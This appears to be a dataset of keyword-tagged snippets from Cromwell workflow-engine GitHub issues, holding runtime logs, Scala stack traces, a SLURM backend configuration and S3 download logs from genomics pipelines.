[9e4f5894main.date_of_death:NA:1]: Unrecognized runtime attribute keys: dx_timeout; [2022-12-15 21:23:00,37] [info] BT-322 9e4f5894:main.date_of_death:-1:1 cache hit copying success with aggregated hashes: initial = 179EA0EE9B87629C24E64D33DEB38610, file = EF056BD27B3A512F77663A400D778CCF.; [2022-12-15 21:23:00,37] [info] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-EngineJobExecutionActor-main.date_of_death:NA:1 [9e4f5894]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:23:00,67] [warn] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-BackendCacheHitCopyingActor-9e4f5894:main.white_brits:-1:1-20000000000 [9e4f5894main.white_brits:NA:1]: Unrecognized runtime attribute keys: dx_timeout; [2022-12-15 21:23:00,68] [info] BT-322 9e4f5894:main.white_brits:-1:1 cache hit copying success with aggregated hashes: initial = EB2F16A",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6971:25846,cache,cache,25846,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971,1,['cache'],['cache']
Performance,"4]: Key/s [dx_timeout] is/are not supported by backend. Unsupported attributes will not be part of job executions.; [2022-12-15 21:14:56,52] [warn] Local [9e4f5894]: Key/s [dx_timeout] is/are not supported by backend. Unsupported attributes will not be part of job executions.; [2022-12-15 21:14:56,52] [warn] Local [9e4f5894]: Key/s [shortTask, dx_timeout] is/are not supported by backend. Unsupported attributes will not be part of job executions.; [2022-12-15 21:14:56,52] [warn] Local [9e4f5894]: Key/s [dx_timeout] is/are not supported by backend. Unsupported attributes will not be part of job executions.; [2022-12-15 21:14:56,53] [warn] Local [9e4f5894]: Key/s [shortTask, dx_timeout] is/are not supported by backend. Unsupported attributes will not be part of job executions.; [2022-12-15 21:14:56,53] [warn] Local [9e4f5894]: Key/s [memory, dx_timeout] is/are not supported by backend. Unsupported attributes will not be part of job executions.; [2022-12-15 21:14:58,56] [info] Not triggering log of restart checking token queue status. Effective log interval = None; [2022-12-15 21:14:58,68] [info] Not triggering log of execution token queue status. Effective log interval = None; [2022-12-15 21:14:58,68] [info] WorkflowExecutionActor-9e4f5894-f7e6-4e2f-be4b-f547d6de7fff [9e4f5894]: Starting main.kinship_count, main.reported_sex, main.phenotype, main.month_of_birth, main.pcs, main.white_brits, main.year_of_birt; h, main.sex_aneuploidy, main.date_of_death, main.genetic_sex, main.ethnicity_self_report, main.assessment_ages; [2022-12-15 21:15:00,77] [info] WorkflowExecutionActor-9e4f5894-f7e6-4e2f-be4b-f547d6de7fff [9e4f5894]: Starting main.categorical_covariates; [2022-12-15 21:15:03,68] [info] Assigned new job execution tokens to the following groups: 9e4f5894: 10; [2022-12-15 21:15:03,81] [info] BT-322 9e4f5894:main.phenotype:-1:1 is eligible for call caching with read = true and write = true; [2022-12-15 21:15:03,81] [info] BT-322 9e4f5894:main.white_brits:-1:1 is eligibl",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6971:19184,queue,queue,19184,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971,1,['queue'],['queue']
Performance,"4f5894:main.categorical_covariates:0:1 cache hit copying success with aggregated hashes: initial = C760DC2B9015D0B787EF7BEE7D21AA58, file = EF056BD27B3A512F77663A400D778CCF.; [2022-12-15 21:27:55,79] [info] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-EngineJobExecutionActor-main.categorical_covariates:0:1 [9e4f5894]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:27:55,79] [warn] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-BackendCacheHitCopyingActor-9e4f5894:main.pcs:-1:1-20000000010 [9e4f5894main.pcs:NA:1]: Unrecognized runtime attribute keys: dx_timeout; [2022-12-15 21:27:55,79] [info] BT-322 9e4f5894:main.pcs:-1:1 cache hit copying success with aggregated hashes: initial = 58D108557F21E539CF9BE064A9528392, file = EF056BD27B3A512F77663A400D778CCF.; [2022-12-15 21:27:55,79] [info] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-EngineJobExecutionActor-main.pcs:NA:1 [9e4f5894]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:27:56,12] [warn] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-BackendCacheHitCopyingActor-9e4f5894:main.ethnicity_self_report:-1:1-20000000008 [9e4f5894main.ethnicity_self_report:NA:1]: Unrecognized runtime attribute keys: dx_t; imeout; [2022-12-15 21:27:56,12] [info] BT-322 9e4f5894:main.ethnicity_self_report:-1:1 cache hit copying success with aggregated hashes: initial = A32F403CF4C1AEE5AC6D327D9290D15E, file = EF056BD27B3A512F77663A400D778CCF.; [2022-12-15 21:27:56,12] [info] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-EngineJobExecutionActor-main.ethnicity_self_report:NA:1 [9e4f5894]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:27:56,51] [info] WorkflowExecutionActor-9e4f5894-f7e6-4e2f-be4b-f547d6de7fff [9e4f5894]: Job results retrieved (CallCached): 'main.categorical_covariates' (scatter index: Some(0), attempt 1); [2022-12-15 21:27:56,51] [info] WorkflowExecutionActor-9e4f5894-f7e6-4e2f-be4b-f547d6de7fff [9e4f5894]: Job results retri",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6971:31372,cache,cache,31372,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971,1,['cache'],['cache']
Performance,"5) ; at cromwell.services.ServiceRegistryActor.serviceProps(ServiceRegistryActor.scala:63) ; at cromwell.services.ServiceRegistryActor.<init>(ServiceRegistryActor.scala:65) ; at cromwell.services.ServiceRegistryActor$.$anonfun$props$1(ServiceRegistryActor.scala:25) ; at akka.actor.TypedCreatorFunctionConsumer.produce(IndirectActorProducer.scala:87) ; at akka.actor.Props.newActor(Props.scala:212) ; at akka.actor.ActorCell.newActor(ActorCell.scala:624) ; at akka.actor.ActorCell.create(ActorCell.scala:650) ; ... 9 more ; ```. If I add in a `services` stanza, though, it asks me to define the class of each service, even though they should probably have default values:; ```; [ERROR] [01/24/2019 11:09:59.741] [cromwell-system-akka.dispatchers.service-dispatcher-10] [akka://cromwell-system/user/SingleWorkflowRunnerActor/ServiceRegistryActor] Received ServiceRegistryMessage requ; esting service 'LoadController' for which no service is configured. Message: LoadMetric(NonEmptyList(CallCacheWriteActor),NormalLoad) ; [ERROR] [01/24/2019 11:09:59.731] [cromwell-system-akka.dispatchers.service-dispatcher-10] [akka://cromwell-system/user/SingleWorkflowRunnerActor/ServiceRegistryActor] Received ServiceRegistryMessage requ; esting service 'Instrumentation' for which no service is configured. Message: InstrumentationServiceMessage(CromwellGauge(CromwellBucket(List(job),NonEmptyList(callcaching, read, $y, queue)),0)); ```. ***. Here's my config file for Cromwell 36 (that works):; ```; backend {; default = spartan. providers {; spartan {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; runtime-attributes = """"""; Int runtime_minutes = 600; Int cpus = 2; Int requested_memory_mb_per_core = 8000; String? docker; """""". submit = """"""; sbatch -J ${job_name} -D ${cwd} -o ${out} -e ${err} -t ${runtime_minutes} \; ${""-c "" + cpus} \; --mem-per-cpu=${requested_memory_mb_per_core} \; --wrap ""/bin/bash ${script}""; """""". submit-docker = """"""; module load Sin",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4577:2979,Load,LoadMetric,2979,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4577,1,['Load'],['LoadMetric']
Performance,"5-2d1d-4e24-a08; 6-c47fa847c658/call-ApplyBQSR/shard-2/stderr"": Your ""GCE"" credentials are invalid. Please run; $ gcloud auth login; Failure: Could not reach metadata service: [Errno 111] Connection refused. at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor$.StandardException(PipelinesApiAsyncBackendJobExecutionActor.scala:76); at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleFailedRunStatus$1(PipelinesApiAsyncBackendJobExecutionActor.scala:536); at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:543); at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:80); at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$handleExecutionResult$3(StandardAsyncExecutionActor.scala:1037); at scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:303); at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:43); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:197",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3742:1898,concurren,concurrent,1898,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3742,1,['concurren'],['concurrent']
Performance,"5fd268a04d997240e7e/NWD113429.7682e7b9-824b-4307-a101-98d0bcc31e82.0001.g.vcf.gz.tbi"", ""gs://broad-gotc-dev-storage/cromwell_execution/JointGenotyping/606107ba-fb48-489f-8d14-e19192331b82/call-SplitGvcf/shard-1/glob-a859a146d6b8e5fd268a04d997240e7e/NWD123256.a69a5041-cdcc-4c7d-82e4-47f3d422c441.0001.g.vcf.gz.tbi"", ""gs://broad-gotc-dev-storage/cromwell_execution/JointGenotyping/606107ba-fb48-489f-8d14-e19192331b82/call-SplitGvcf/shard-2/glob-a859a146d6b8e5fd268a04d997240e7e/NWD145410.61ccb202-d666-4fad-ba17-351fabd79cd1.0001.g.vcf.gz.tbi""]`. **Start of the logs**. 2016-04-11 22:41:00,479 cromwell-system-akka.actor.default-dispatcher-2683 INFO - WorkflowActor [UUID(606107ba)]: persisting status of TileDBCombineGVCF:1048 to Starting.; 2016-04-11 22:41:00,479 cromwell-system-akka.actor.default-dispatcher-2683 INFO - WorkflowActor [UUID(606107ba)]: Call Caching: cache miss; 2016-04-11 22:41:00,490 cromwell-system-akka.actor.default-dispatcher-2683 INFO - WorkflowActor [UUID(606107ba)]: Call Caching: cache miss; 2016-04-11 22:41:00,521 cromwell-system-akka.actor.default-dispatcher-2683 ERROR - WorkflowActor [UUID(606107ba)]: Failed to fetch locally qualified inputs for call TileDBCombineGVCF:1048; wdl4s.WdlExpressionException: Failed to find index Success(WdlInteger(1048)) on array:. **and the following stacktrace associated with these:**. 1048; at wdl4s.expression.ValueEvaluator.evaluate(ValueEvaluator.scala:112) ~[cromwell.jar:0.19]; at wdl4s.WdlExpression$.evaluate(WdlExpression.scala:79) ~[cromwell.jar:0.19]; at wdl4s.WdlExpression.evaluate(WdlExpression.scala:192) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor$$anonfun$fetchLocallyQualifiedInputs$1$$anonfun$apply$16.apply(WorkflowActor.scala:987) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor$$anonfun$fetchLocallyQualifiedInputs$1$$anonfun$apply$16.apply(WorkflowActor.scala:982) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:245) ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/695:2967,cache,cache,2967,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/695,1,['cache'],['cache']
Performance,6); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$poll$2.apply(StandardAsyncExecutionActor.scala:291); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$poll$2.apply(StandardAsyncExecutionActor.scala:290); 	at scala.util.Success$$anonfun$map$1.apply(Try.scala:237); 	at scala.util.Try$.apply(Try.scala:192); 	at scala.util.Success.map(Try.scala:237); 	at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:237); 	at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:237); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: com.google.cloud.storage.StorageException: 503 Service Unavailable; Backend Error; 	at com.google.cloud.storage.spi.DefaultStorageRpc.translate(DefaultStorageRpc.java:190); 	at com.google.cloud.storage.spi.DefaultStorageRpc.read(DefaultStorageRpc.java:482); 	at com.google.cloud.storage.BlobReadChannel$1.call(BlobReadChannel.java:127); 	at com.google.clo,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1923:3398,concurren,concurrent,3398,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1923,1,['concurren'],['concurrent']
Performance,"6-08-08 08:33:10,291] [info] WorkflowActor [←[38;5;2m4e20eafc←[0m]: persisting status of hello to Running.; [2016-08-08 08:33:10,311] [←[38;5;1merror←[0m] BackendCallExecutionActor [←[38;5 ;2m4e20eafc←[0m:hello]: Cannot run program ""/bin/bash"": CreateProcess error=2, Impossibile trovare il file specificato; java.io.IOException: Cannot run program ""/bin/bash"": CreateProcess error=2, Impossibile trovare il file specificato; at java.lang.ProcessBuilder.start(Unknown Source); at scala.sys.process.ProcessBuilderImpl$Simple.run(ProcessBuilderImpl.scala:69); at scala.sys.process.ProcessBuilderImpl$AbstractBuilder.run(ProcessBuilderImpl.scala:100); at scala.sys.process.ProcessBuilderImpl$AbstractBuilder.run(ProcessBuilderImpl.scala:99); at cromwell.engine.backend.local.LocalBackend.cromwell$engine$backend$local$LocalBackend$$runSubprocess(LocalBackend.scala:172); at cromwell.engine.backend.local.LocalBackend$$anonfun$execute$1.apply(LocalBackend.scala:119); at cromwell.engine.backend.local.LocalBackend$$anonfun$execute$1.apply(LocalBackend.scala:113); at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24); at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:24); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.io.IOException: CreateProcess error=2, Impossibile trovare il file specificato; at java.lang.ProcessImpl.create(Native Method); at java.lang.ProcessImpl.<init>(Unknown Source); at java.lang.ProcessImpl.start(Unknown Source); ... 15 common frames omitted; ```. Riccardo",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1261:8645,concurren,concurrent,8645,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1261,6,['concurren'],['concurrent']
Performance,"608597651575,*** COMPLETED LOCALIZATION ***; 1608597657265,[W::hts_idx_load2] The index file is older than the data file: /tmp/scratch/focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-6/cacheCopy/SR00c.HG00239.txt.gz.tbi; 1608597658212,[W::hts_idx_load2] The index file is older than the data file: /tmp/scratch/focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-8/cacheCopy/SR00c.HG00288.txt.gz.tbi; 1608597660320,[W::hts_idx_load2] The index file is older than the data file: /tmp/scratch/focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-11/cacheCopy/SR00c.HG00375.txt.gz.tbi; 1608597660807,[W::hts_idx_load2] The index file is older than the data file: /tmp/scratch/focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-12/cacheCopy/SR00c.HG00410.txt.gz.tbi; 1608597668004,[W::hts_idx_load2] The index file is older than the data file: /tmp/scratch/focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-22/cacheCopy/SR00c.HG01112.txt.gz.tbi; 1608597683790,[W::",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:198845,cache,cacheCopy,198845,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"629); at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsync\; BackendJobExecutionActor.scala:636); at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsync\; BackendJobExecutionActor.scala:88); at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$5.applyOrElse(StandardAsyncExecutionAc\; tor.scala:1114); at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$5.applyOrElse(StandardAsyncExecutionAc\; tor.scala:1110); at scala.concurrent.Future.$anonfun$recoverWith$1(Future.scala:413); at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). 2019-05-24 12:32:08,259 cromwell-system-akka.dispatchers.engine-dispatcher-74 INFO - WorkflowManagerActor WorkflowActor-a309b1f1-2b35\; -UU-:@----F2 cromwell.log.10329.txt 9% L305 (Text) Fri May 24 13:02 1.17 --------------------------------------------------------",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5001:2304,concurren,concurrent,2304,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5001,1,['concurren'],['concurrent']
Performance,"64-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-1/cacheCopy/SR00c.HG00096.txt.gz; 1608597186282,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-128/cacheCopy/SR00c.NA19350.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-128/cacheCopy/SR00c.NA19350.txt.gz.tbi; 1608597189769,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-6/cacheCopy/SR00c.HG00239.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-6/cacheCopy/SR00c.HG00239.txt.gz; 1608597192326,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-145/cacheCopy/SR00c.NA20509.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:68635,cache,cacheCopy,68635,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"64-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-11/cacheCopy/SR00c.HG00375.txt.gz; 1608597146753,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-13/cacheCopy/SR00c.HG00457.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-13/cacheCopy/SR00c.HG00457.txt.gz.tbi; 1608597149087,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-16/cacheCopy/SR00c.HG00625.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-16/cacheCopy/SR00c.HG00625.txt.gz; 1608597152166,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-63/cacheCopy/SR00c.HG02586.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:57434,cache,cacheCopy,57434,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"64-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-13/cacheCopy/SR00c.HG00457.txt.gz; 1608597208254,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-90/cacheCopy/SR00c.HG03722.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-90/cacheCopy/SR00c.HG03722.txt.gz.tbi; 1608597210297,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-18/cacheCopy/SR00c.HG00740.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-18/cacheCopy/SR00c.HG00740.txt.gz.tbi; 1608597211840,download: 